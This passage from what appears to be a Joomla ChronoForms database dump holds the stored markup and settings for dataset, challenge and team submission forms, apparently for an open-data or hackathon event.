"action_url\":\"\",\"form_tag_attach\":\"\",\"add_form_tags\":\"1\",\"relative_url\":\"1\",\"dynamic_files\":\"0\",\"show_top_errors\":\"1\",\"datepicker_config\":\"\",\"datepicker_type\":\"0\",\"datepicker_moo_style\":\"datepicker_dashboard\",\"enable_jsvalidation\":\"1\",\"jsvalidation_errors\":\"1\",\"jsvalidation_theme\":\"classic\",\"jsvalidation_lang\":\"en\",\"jsvalidation_showErrors\":\"0\",\"jsvalidation_errorsLocation\":\"1\",\"adminview_actions\":\"\",\"dataview_actions\":\"\",\"app_exclusive\":\"0\"}',1,''),(2,'Datasets',1,'<fieldset class=\"cf_container ccms_form_element \" id=\"cf_container_9\"><legend>Submit your datasets or resources</legend><div class=\"ccms_form_element cfdiv_text\" id=\"name1_container_div\" style=\"\"><label>Organization/Business Name</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"name\" />\n<div class=\"clear\"></div><div id=\"error-message-name\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"email1_container_div\" style=\"\"><label>Contact Email</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'email\']\" title=\"\" type=\"text\" value=\"\" name=\"email\" />\n<div class=\"clear\"></div><div id=\"error-message-email\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"phone1_container_div\" style=\"\"><label>Contact Phone</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'phone\']\" title=\"\" type=\"text\" value=\"\" name=\"phone\" />\n<div class=\"clear\"></div><div id=\"error-message-phone\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"dataset_title1_container_div\" style=\"\"><label>Dataset Title</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"dataset_title\" />\n<div class=\"clear\"></div><div id=\"error-message-dataset_title\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"dataset_url1_container_div\" style=\"\"><label>Dataset URL</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'url\']\" title=\"\" type=\"text\" value=\"\" name=\"dataset_url\" />\n<div class=\"clear\"></div><div id=\"error-message-dataset_url\"></div></div><div class=\"ccms_form_element cfdiv_select\" id=\"format1_container_div\" style=\"\"><label>Format</label><select size=\"1\" class=\" validate[\'required\']\" title=\"\" name=\"format\">\n<option value=\"HTML\">HTML</option>\n<option value=\"CSV\">CSV</option>\n<option value=\"SQL\">SQL</option>\n<option value=\"TXT\">TXT</option>\n<option value=\"Other\">Other</option>\n<option value=\"\" selected=\"selected\"></option>\n</select>\n<div class=\"clear\"></div><div id=\"error-message-format\"></div></div></fieldset><div class=\"ccms_form_element cfdiv_text\" id=\"chrono_verification1_container_div\" style=\"\"><label>Enter the code</label><input maxlength=\"5\" size=\"5\" class=\"chrono_captcha_input\" title=\"\" type=\"text\" value=\"\" name=\"chrono_verification\" />\n{chronocaptcha_img}<div class=\"clear\"></div><div id=\"error-message-chrono_verification\"></div></div><div class=\"ccms_form_element cfdiv_submit\" id=\"input_submit_61_container_div\" style=\"text-align:left\"><input name=\"input_submit_6\" class=\"\" value=\"Submit\" type=\"submit\" />\n<div class=\"clear\"></div><div id=\"error-message-input_submit_6\"></div></div>','array (\n  \'field_1\' => \n  array (\n    \'input_container_1_area_label\' => \'Sponsorhip\',\n    \'input_container_1_collapsed\' => \'0\',\n    \'input_container_1_container_type\' => \'\',\n    \'input_container_1_container_class\' => \'box2 title4\',\n    \'input_container_1_start_code\' => \'\',\n    \'input_container_1_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_9\' => \n  array (\n    \'input_container_9_area_label\' => \'Submit your datasets or resources\',\n    \'input_container_9_collapsed\' => \'0\',\n    \'input_container_9_container_type\' => \'fieldset\',\n    \'input_container_9_container_class\' => \'\',\n    \'input_container_9_start_code\' => \'\',\n    \'input_container_9_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'1\',\n  ),\n  \'field_32\' => \n  array (\n    \'input_text_32_input_id\' => \'\',\n    \'input_text_32_label_text\' => \'Organization/Business Name\',\n    \'input_text_32_input_name\' => \'name\',\n    \'input_text_32_input_value\' => \'\',\n    \'input_text_32_input_maxlength\' => \'150\',\n    \'input_text_32_input_size\' => \'30\',\n    \'input_text_32_input_class\' => \'\',\n    \'input_text_32_input_title\' => \'\',\n    \'input_text_32_label_over\' => \'0\',\n    \'input_text_32_hide_label\' => \'0\',\n    \'input_text_32_multiline_start\' => \'0\',\n    \'input_text_32_multiline_add\' => \'0\',\n    \'input_text_32_validations\' => \'required\',\n    \'input_text_32_instructions\' => \'\',\n    \'input_text_32_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_35\' => \n  array (\n    \'input_text_35_input_id\' => \'\',\n    \'input_text_35_label_text\' => \'Contact Email\',\n    \'input_text_35_input_name\' => \'email\',\n    \'input_text_35_input_value\' => \'\',\n    \'input_text_35_input_maxlength\' => \'150\',\n    \'input_text_35_input_size\' => \'30\',\n    \'input_text_35_input_class\' => \'\',\n    \'input_text_35_input_title\' => \'\',\n    \'input_text_35_label_over\' => \'0\',\n    \'input_text_35_hide_label\' => \'0\',\n    \'input_text_35_multiline_start\' => \'0\',\n    \'input_text_35_multiline_add\' => \'0\',\n    \'input_text_35_validations\' => \'required,email\',\n    \'input_text_35_instructions\' => \'\',\n    \'input_text_35_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_38\' => \n  array (\n    \'input_text_38_input_id\' => \'\',\n    \'input_text_38_label_text\' => \'Contact Phone\',\n    \'input_text_38_input_name\' => \'phone\',\n    \'input_text_38_input_value\' => \'\',\n    \'input_text_38_input_maxlength\' => \'150\',\n    \'input_text_38_input_size\' => \'30\',\n    \'input_text_38_input_class\' => \'\',\n    \'input_text_38_input_title\' => \'\',\n    \'input_text_38_label_over\' => \'0\',\n    \'input_text_38_hide_label\' => \'0\',\n    \'input_text_38_multiline_start\' => \'0\',\n    \'input_text_38_multiline_add\' => \'0\',\n    \'input_text_38_validations\' => \'required,phone\',\n    \'input_text_38_instructions\' => \'\',\n    \'input_text_38_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_30\' => \n  array (\n    \'input_text_30_input_id\' => \'\',\n    \'input_text_30_label_text\' => \'Dataset Title\',\n    \'input_text_30_input_name\' => \'dataset_title\',\n    \'input_text_30_input_value\' => \'\',\n    \'input_text_30_input_maxlength\' => \'150\',\n    \'input_text_30_input_size\' => \'30\',\n    \'input_text_30_input_class\' => \'\',\n    \'input_text_30_input_title\' => \'\',\n    \'input_text_30_label_over\' => \'0\',\n    \'input_text_30_hide_label\' => \'0\',\n    \'input_text_30_multiline_start\' => \'0\',\n    \'input_text_30_multiline_add\' => \'0\',\n    \'input_text_30_validations\' => \'required\',\n    \'input_text_30_instructions\' => \'\',\n    \'input_text_30_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_19\' => \n  array (\n    \'input_text_19_input_id\' => \'\',\n    \'input_text_19_label_text\' => \'Dataset URL\',\n    \'input_text_19_input_name\' => \'dataset_url\',\n    \'input_text_19_input_value\' => \'\',\n    \'input_text_19_input_maxlength\' => \'150\',\n    \'input_text_19_input_size\' => \'30\',\n    \'input_text_19_input_class\' => \'\',\n    \'input_text_19_input_title\' => \'\',\n    \'input_text_19_label_over\' => \'0\',\n    \'input_text_19_hide_label\' => \'0\',\n    \'input_text_19_multiline_start\' => \'0\',\n    \'input_text_19_multiline_add\' => \'0\',\n    \'input_text_19_validations\' => \'required,url\',\n    \'input_text_19_instructions\' => \'\',\n    \'input_text_19_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_31\' => \n  array (\n    \'input_select_31_input_id\' => \'\',\n    \'input_select_31_label_text\' => \'Format\',\n    \'input_select_31_input_name\' => \'format\',\n    \'input_select_31_size\' => \'1\',\n    \'input_select_31_input_class\' => \'\',\n    \'input_select_31_input_title\' => \'\',\n    \'input_select_31_label_over\' => \'0\',\n    \'input_select_31_hide_label\' => \'0\',\n    \'input_select_31_selected\' => \'\',\n    \'input_select_31_showempty\' => \'\',\n    \'input_select_31_multiple\' => \'0\',\n    \'input_select_31_multiline_start\' => \'0\',\n    \'input_select_31_multiline_add\' => \'0\',\n    \'input_select_31_enable_dynamic_data\' => \'0\',\n    \'input_select_31_data_path\' => \'\',\n    \'input_select_31_value_key\' => \'\',\n    \'input_select_31_text_key\' => \'\',\n    \'input_select_31_options\' => \'HTML=HTML\r\nCSV=CSV\r\nSQL=SQL\r\nTXT=TXT\r\nOther=Other\r\n=\',\n    \'input_select_31_validations\' => \'required\',\n    \'input_select_31_instructions\' => \'\',\n    \'input_select_31_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'select\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_5\' => \n  array (\n    \'input_captcha_5_input_id\' => \'\',\n    \'input_captcha_5_label_text\' => \'Enter the code\',\n    \'input_captcha_5_input_name\' => \'chrono_verification\',\n    \'input_captcha_5_input_value\' => \'\',\n    \'input_captcha_5_input_maxlength\' => \'5\',\n    \'input_captcha_5_input_size\' => \'5\',\n    \'input_captcha_5_input_class\' => \'chrono_captcha_input\',\n    \'input_captcha_5_input_title\' => \'\',\n    \'input_captcha_5_label_over\' => \'0\',\n    \'input_captcha_5_hide_label\' => \'0\',\n    \'input_captcha_5_validations\' => \'\',\n    \'input_captcha_5_instructions\' => \'\',\n    \'input_captcha_5_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'captcha\',\n    \'real_type\' => \'text\',\n    \'after\' => \'{chronocaptcha_img}\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_6\' => \n  array (\n    \'input_submit_6_input_id\' => \'\',\n    \'input_submit_6_input_name\' => \'input_submit_6\',\n    \'input_submit_6_input_value\' => \'Submit\',\n    \'input_submit_6_input_class\' => \'\',\n    \'input_submit_6_button_type\' => \'submit\',\n    \'input_submit_6_button_align\' => \'left\',\n    \'input_submit_6_back_button\' => \'0\',\n    \'input_submit_6_reset_button\' => \'0\',\n    \'input_submit_6_back_button_value\' => \'Back\',\n    \'input_submit_6_reset_button_value\' => \'Reset\',\n    \'input_submit_6_multiline_start\' => \'0\',\n    \'input_submit_6_multiline_add\' => \'0\',\n    \'tag\' => \'input\',\n    \'type\' => \'submit\',\n    \'container_id\' => \'0\',\n  ),\n)','YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjQ6ImxvYWQiO2E6MTp7czo3OiJhY3Rpb25zIjthOjQ6e3M6MTg6ImNmYWN0aW9uX2xvYWRfanNfMCI7czowOiIiO3M6MTk6ImNmYWN0aW9uX2xvYWRfY3NzXzEiO3M6MDoiIjtzOjIzOiJjZmFjdGlvbl9sb2FkX2NhcHRjaGFfMiI7czowOiIiO3M6MjA6ImNmYWN0aW9uX3Nob3dfaHRtbF8zIjtzOjA6IiI7fX1zOjY6InN1Ym1pdCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTI6e3M6MjQ6ImNmYWN0aW9uX2NoZWNrX2NhcHRjaGFfNCI7YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjM3OiJjZmFjdGlvbmV2ZW50X2NoZWNrX2NhcHRjaGFfNF9zdWNjZXNzIjtzOjA6IiI7czozNDoiY2ZhY3Rpb25ldmVudF9jaGVja19jYXB0Y2hhXzRfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF81IjtzOjA6IiI7fX19fXM6MjM6ImNmYWN0aW9uX3VwbG9hZF9maWxlc182IjthOjE6e3M6NjoiZXZlbnRzIjthOjI6e3M6MzY6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfc3VjY2VzcyI7czowOiIiO3M6MzM6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF83IjtzOjA6IiI7fX19fXM6MjI6ImNmYWN0aW9uX2N1c3RvbV9jb2RlXzgiO3M6MDoiIjtzOjI1OiJjZmFjdGlvbl9oYW5kbGVfYXJyYXlzXzE2IjtzOjA6IiI7czoxODoiY2ZhY3Rpb25fZGJfc2F2ZV85IjtzOjA6IiI7czoxNzoiY2ZhY3Rpb25fZW1haWxfMTAiO3M6MDoiIjtzOjE3OiJjZmFjdGlvbl9lbWFpbF8xMSI7czowOiIiO3M6MTc6ImNmYWN0aW9uX2VtYWlsXzEyIjtzOjA6IiI7czoyMzoiY2ZhY3Rpb25fY3VzdG9tX2NvZGVfMTMiO3M6MDoiIjtzOjMxOiJjZmFjdGlvbl9zaG93X3RoYW5rc19tZXNzYWdlXzE0IjtzOjA6IiI7czoyNToiY2ZhY3Rpb25fcmVkaXJlY3RfdXNlcl8yMCI7czowOiIiO3M6MjA6ImNmYWN0aW9uX2RlYnVnZ2VyXzE4IjtzOjA6IiI7fX19fQ==','{\"form_mode\":\"easy\",\"form_method\":\"post\",\"auto_detect_settings\":\"1\",\"load_files\":\"2\",\"tight_layout\":\"0\",\"action_url\":\"\",\"form_tag_attach\":\"\",\"add_form_tags\":\"1\",\"relative_url\":\"1\",\"dynamic_files\":\"0\",\"show_top_errors\":\"1\",\"datepicker_config\":\"\",\"datepicker_type\":\"0\",\"datepicker_moo_style\":\"datepicker_dashboard\",\"enable_jsvalidation\":\"1\",\"jsvalidation_errors\":\"1\",\"jsvalidation_theme\":\"classic\",\"jsvalidation_lang\":\"en\",\"jsvalidation_showErrors\":\"0\",\"jsvalidation_errorsLocation\":\"1\",\"adminview_actions\":\"\",\"dataview_actions\":\"\",\"app_exclusive\":\"0\"}',1,''),(3,'Challenges',1,'<fieldset class=\"cf_container ccms_form_element \" id=\"cf_container_9\"><legend>Submit your challenges</legend><div class=\"ccms_form_element cfdiv_text\" id=\"name1_container_div\" style=\"\"><label>Organization/Business Name</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"name\" />\n<div class=\"clear\"></div><div id=\"error-message-name\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"email1_container_div\" style=\"\"><label>Contact Email</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'email\']\" title=\"\" type=\"text\" value=\"\" name=\"email\" />\n<div class=\"clear\"></div><div id=\"error-message-email\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"phone1_container_div\" style=\"\"><label>Contact Phone</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'phone\']\" title=\"\" type=\"text\" value=\"\" name=\"phone\" />\n<div class=\"clear\"></div><div id=\"error-message-phone\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"challenge_title1_container_div\" style=\"\"><label>Challenge Title</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"challenge_title\" />\n<div class=\"clear\"></div><div id=\"error-message-challenge_title\"></div></div><div class=\"ccms_form_element cfdiv_textarea\" id=\"challenge_description1_container_div\" style=\"\"><label>Challenge Description</label><?php $editor = JFactory::getEditor(); echo $editor->display(\'challenge_description\', \'\', 400, 200, 12, 45, 1); ?><div class=\"clear\"></div><div id=\"error-message-challenge_description\"></div></div></fieldset><div class=\"ccms_form_element cfdiv_text\" id=\"chrono_verification1_container_div\" style=\"\"><label>Enter the code</label><input maxlength=\"5\" size=\"5\" class=\"chrono_captcha_input\" title=\"\" type=\"text\" value=\"\" name=\"chrono_verification\" />\n{chronocaptcha_img}<div class=\"clear\"></div><div id=\"error-message-chrono_verification\"></div></div><div class=\"ccms_form_element cfdiv_submit\" id=\"input_submit_61_container_div\" style=\"text-align:left\"><input name=\"input_submit_6\" class=\"\" value=\"Submit\" type=\"submit\" />\n<div class=\"clear\"></div><div id=\"error-message-input_submit_6\"></div></div>','array (\n  \'field_1\' => \n  array (\n    \'input_container_1_area_label\' => \'Sponsorhip\',\n    \'input_container_1_collapsed\' => \'0\',\n    \'input_container_1_container_type\' => \'\',\n    \'input_container_1_container_class\' => \'box2 title4\',\n    \'input_container_1_start_code\' => \'\',\n    \'input_container_1_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_9\' => \n  array (\n    \'input_container_9_area_label\' => \'Submit your challenges\',\n    \'input_container_9_collapsed\' => \'0\',\n    \'input_container_9_container_type\' => \'fieldset\',\n    \'input_container_9_container_class\' => \'\',\n    \'input_container_9_start_code\' => \'\',\n    \'input_container_9_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'1\',\n  ),\n  \'field_32\' => \n  array (\n    \'input_text_32_input_id\' => \'\',\n    \'input_text_32_label_text\' => \'Organization/Business Name\',\n    \'input_text_32_input_name\' => \'name\',\n    \'input_text_32_input_value\' => \'\',\n    \'input_text_32_input_maxlength\' => \'150\',\n    \'input_text_32_input_size\' => \'30\',\n    \'input_text_32_input_class\' => \'\',\n    \'input_text_32_input_title\' => \'\',\n    \'input_text_32_label_over\' => \'0\',\n    \'input_text_32_hide_label\' => \'0\',\n    \'input_text_32_multiline_start\' => \'0\',\n    \'input_text_32_multiline_add\' => \'0\',\n    \'input_text_32_validations\' => \'required\',\n    \'input_text_32_instructions\' => \'\',\n    \'input_text_32_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_35\' => \n  array (\n    \'input_text_35_input_id\' => \'\',\n    \'input_text_35_label_text\' => \'Contact Email\',\n    \'input_text_35_input_name\' => \'email\',\n    \'input_text_35_input_value\' => \'\',\n    \'input_text_35_input_maxlength\' => \'150\',\n    \'input_text_35_input_size\' => \'30\',\n    \'input_text_35_input_class\' => \'\',\n    \'input_text_35_input_title\' => \'\',\n    \'input_text_35_label_over\' => \'0\',\n    \'input_text_35_hide_label\' => \'0\',\n    \'input_text_35_multiline_start\' => \'0\',\n    \'input_text_35_multiline_add\' => \'0\',\n    \'input_text_35_validations\' => \'required,email\',\n    \'input_text_35_instructions\' => \'\',\n    \'input_text_35_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_38\' => \n  array (\n    \'input_text_38_input_id\' => \'\',\n    \'input_text_38_label_text\' => \'Contact Phone\',\n    \'input_text_38_input_name\' => \'phone\',\n    \'input_text_38_input_value\' => \'\',\n    \'input_text_38_input_maxlength\' => \'150\',\n    \'input_text_38_input_size\' => \'30\',\n    \'input_text_38_input_class\' => \'\',\n    \'input_text_38_input_title\' => \'\',\n    \'input_text_38_label_over\' => \'0\',\n    \'input_text_38_hide_label\' => \'0\',\n    \'input_text_38_multiline_start\' => \'0\',\n    \'input_text_38_multiline_add\' => \'0\',\n    \'input_text_38_validations\' => \'required,phone\',\n    \'input_text_38_instructions\' => \'\',\n    \'input_text_38_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_30\' => \n  array (\n    \'input_text_30_input_id\' => \'\',\n    \'input_text_30_label_text\' => \'Challenge Title\',\n    \'input_text_30_input_name\' => \'challenge_title\',\n    \'input_text_30_input_value\' => \'\',\n    \'input_text_30_input_maxlength\' => \'150\',\n    \'input_text_30_input_size\' => \'30\',\n    \'input_text_30_input_class\' => \'\',\n    \'input_text_30_input_title\' => \'\',\n    \'input_text_30_label_over\' => \'0\',\n    \'input_text_30_hide_label\' => \'0\',\n    \'input_text_30_multiline_start\' => \'0\',\n    \'input_text_30_multiline_add\' => \'0\',\n    \'input_text_30_validations\' => \'required\',\n    \'input_text_30_instructions\' => \'\',\n    \'input_text_30_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_39\' => \n  array (\n    \'input_textarea_39_input_id\' => \'\',\n    \'input_textarea_39_label_text\' => \'Challenge Description\',\n    \'input_textarea_39_input_name\' => \'challenge_description\',\n    \'input_textarea_39_input_value\' => \'\',\n    \'input_textarea_39_input_class\' => \'\',\n    \'input_textarea_39_input_title\' => \'\',\n    \'input_textarea_39_label_over\' => \'0\',\n    \'input_textarea_39_hide_label\' => \'0\',\n    \'input_textarea_39_input_cols\' => \'45\',\n    \'input_textarea_39_input_rows\' => \'12\',\n    \'input_textarea_39_wysiwyg_editor\' => \'1\',\n    \'input_textarea_39_editor_buttons\' => \'1\',\n    \'input_textarea_39_editor_width\' => \'400\',\n    \'input_textarea_39_editor_height\' => \'200\',\n    \'input_textarea_39_multiline_start\' => \'0\',\n    \'input_textarea_39_multiline_add\' => \'0\',\n    \'input_textarea_39_validations\' => \'required\',\n    \'input_textarea_39_instructions\' => \'\',\n    \'input_textarea_39_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'textarea\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_5\' => \n  array (\n    \'input_captcha_5_input_id\' => \'\',\n    \'input_captcha_5_label_text\' => \'Enter the code\',\n    \'input_captcha_5_input_name\' => \'chrono_verification\',\n    \'input_captcha_5_input_value\' => \'\',\n    \'input_captcha_5_input_maxlength\' => \'5\',\n    \'input_captcha_5_input_size\' => \'5\',\n    \'input_captcha_5_input_class\' => \'chrono_captcha_input\',\n    \'input_captcha_5_input_title\' => \'\',\n    \'input_captcha_5_label_over\' => \'0\',\n    \'input_captcha_5_hide_label\' => \'0\',\n    \'input_captcha_5_validations\' => \'\',\n    \'input_captcha_5_instructions\' => \'\',\n    \'input_captcha_5_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'captcha\',\n    \'real_type\' => \'text\',\n    \'after\' => \'{chronocaptcha_img}\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_6\' => \n  array (\n    \'input_submit_6_input_id\' => \'\',\n    \'input_submit_6_input_name\' => \'input_submit_6\',\n    \'input_submit_6_input_value\' => \'Submit\',\n    \'input_submit_6_input_class\' => \'\',\n    \'input_submit_6_button_type\' => \'submit\',\n    \'input_submit_6_button_align\' => \'left\',\n    \'input_submit_6_back_button\' => \'0\',\n    \'input_submit_6_reset_button\' => \'0\',\n    \'input_submit_6_back_button_value\' => \'Back\',\n    \'input_submit_6_reset_button_value\' => \'Reset\',\n    \'input_submit_6_multiline_start\' => \'0\',\n    \'input_submit_6_multiline_add\' => \'0\',\n    \'tag\' => \'input\',\n    \'type\' => \'submit\',\n    \'container_id\' => \'0\',\n  ),\n)','YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjQ6ImxvYWQiO2E6MTp7czo3OiJhY3Rpb25zIjthOjQ6e3M6MTg6ImNmYWN0aW9uX2xvYWRfanNfMCI7czowOiIiO3M6MTk6ImNmYWN0aW9uX2xvYWRfY3NzXzEiO3M6MDoiIjtzOjIzOiJjZmFjdGlvbl9sb2FkX2NhcHRjaGFfMiI7czowOiIiO3M6MjA6ImNmYWN0aW9uX3Nob3dfaHRtbF8zIjtzOjA6IiI7fX1zOjY6InN1Ym1pdCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTI6e3M6MjQ6ImNmYWN0aW9uX2NoZWNrX2NhcHRjaGFfNCI7YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjM3OiJjZmFjdGlvbmV2ZW50X2NoZWNrX2NhcHRjaGFfNF9zdWNjZXNzIjtzOjA6IiI7czozNDoiY2ZhY3Rpb25ldmVudF9jaGVja19jYXB0Y2hhXzRfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF81IjtzOjA6IiI7fX19fXM6MjM6ImNmYWN0aW9uX3VwbG9hZF9maWxlc182IjthOjE6e3M6NjoiZXZlbnRzIjthOjI6e3M6MzY6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfc3VjY2VzcyI7czowOiIiO3M6MzM6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF83IjtzOjA6IiI7fX19fXM6MjI6ImNmYWN0aW9uX2N1c3RvbV9jb2RlXzgiO3M6MDoiIjtzOjI1OiJjZmFjdGlvbl9oYW5kbGVfYXJyYXlzXzE2IjtzOjA6IiI7czoxODoiY2ZhY3Rpb25fZGJfc2F2ZV85IjtzOjA6IiI7czoxNzoiY2ZhY3Rpb25fZW1haWxfMTAiO3M6MDoiIjtzOjE3OiJjZmFjdGlvbl9lbWFpbF8xMSI7czowOiIiO3M6MTc6ImNmYWN0aW9uX2VtYWlsXzEyIjtzOjA6IiI7czoyMzoiY2ZhY3Rpb25fY3VzdG9tX2NvZGVfMTMiO3M6MDoiIjtzOjMxOiJjZmFjdGlvbl9zaG93X3RoYW5rc19tZXNzYWdlXzE0IjtzOjA6IiI7czoyNToiY2ZhY3Rpb25fcmVkaXJlY3RfdXNlcl8yMCI7czowOiIiO3M6MjA6ImNmYWN0aW9uX2RlYnVnZ2VyXzE4IjtzOjA6IiI7fX19fQ==','{\"form_mode\":\"easy\",\"form_method\":\"post\",\"auto_detect_settings\":\"1\",\"load_files\":\"2\",\"tight_layout\":\"0\",\"action_url\":\"\",\"form_tag_attach\":\"\",\"add_form_tags\":\"1\",\"relative_url\":\"1\",\"dynamic_files\":\"0\",\"show_top_errors\":\"1\",\"datepicker_config\":\"\",\"datepicker_type\":\"0\",\"datepicker_moo_style\":\"datepicker_dashboard\",\"enable_jsvalidation\":\"1\",\"jsvalidation_errors\":\"1\",\"jsvalidation_theme\":\"classic\",\"jsvalidation_lang\":\"en\",\"jsvalidation_showErrors\":\"0\",\"jsvalidation_errorsLocation\":\"1\",\"adminview_actions\":\"\",\"dataview_actions\":\"\",\"app_exclusive\":\"0\"}',1,''),(4,'Teams',1,'<fieldset class=\"cf_container ccms_form_element \" id=\"cf_container_9\"><legend>Form Your Team</legend><div class=\"ccms_form_element cfdiv_text\" id=\"name1_container_div\" style=\"\"><label>Team Name</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"name\" />\n<div class=\"clear\"></div><div id=\"error-message-name\"></div></div><div class=\"ccms_form_element cfdiv_textarea\" id=\"members1_container_div\" style=\"\"><label>Members</label><textarea cols=\"45\" rows=\"12\" class=\" validate[\'required\']\" title=\"\" name=\"members\"></textarea>\n<div class=\"clear\"></div><div id=\"error-message-members\"></div></div><div class=\"ccms_form_element cfdiv_select\" id=\"challenge1_container_div\" style=\"\"><label>Challenge</label><select size=\"1\" class=\" validate[\'required\']\" title=\"\" name=\"challenge\">\n<option value=\"No\">No</option>\n<option value=\"Yes\">Yes</option>\n</select>\n<div class=\"clear\"></div><div id=\"error-message-challenge\"></div></div></fieldset><div class=\"ccms_form_element cfdiv_text\" id=\"chrono_verification1_container_div\" style=\"\"><label>Enter the code</label><input maxlength=\"5\" size=\"5\" class=\"chrono_captcha_input\" title=\"\" type=\"text\" value=\"\" name=\"chrono_verification\" />\n{chronocaptcha_img}<div class=\"clear\"></div><div id=\"error-message-chrono_verification\"></div></div><div class=\"ccms_form_element cfdiv_submit\" id=\"input_submit_61_container_div\" style=\"text-align:left\"><input name=\"input_submit_6\" class=\"\" value=\"Submit\" type=\"submit\" />\n<div class=\"clear\"></div><div id=\"error-message-input_submit_6\"></div></div>','array (\n  \'field_1\' => \n  array (\n    \'input_container_1_area_label\' => \'Sponsorhip\',\n    \'input_container_1_collapsed\' => \'0\',\n    \'input_container_1_container_type\' => \'\',\n    \'input_container_1_container_class\' => \'box2 title4\',\n    \'input_container_1_start_code\' => \'\',\n    \'input_container_1_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_9\' => \n  array (\n    \'input_container_9_area_label\' => \'Form Your Team\',\n    \'input_container_9_collapsed\' => \'0\',\n    \'input_container_9_container_type\' => \'fieldset\',\n    \'input_container_9_container_class\' => \'\',\n    \'input_container_9_start_code\' => \'\',\n    \'input_container_9_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'1\',\n  ),\n  \'field_40\' => \n  array (\n    \'input_text_40_input_id\' => \'\',\n    \'input_text_40_label_text\' => \'Team Name\',\n    \'input_text_40_input_name\' => \'name\',\n    \'input_text_40_input_value\' => \'\',\n    \'input_text_40_input_maxlength\' => \'150\',\n    \'input_text_40_input_size\' => \'30\',\n    \'input_text_40_input_class\' => \'\',\n    \'input_text_40_input_title\' => \'\',\n    \'input_text_40_label_over\' => \'0\',\n    \'input_text_40_hide_label\' => \'0\',\n    \'input_text_40_multiline_start\' => \'0\',\n    \'input_text_40_multiline_add\' => \'0\',\n    \'input_text_40_validations\' => \'required\',\n    \'input_text_40_instructions\' => \'\',\n    \'input_text_40_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_46\' => \n  array 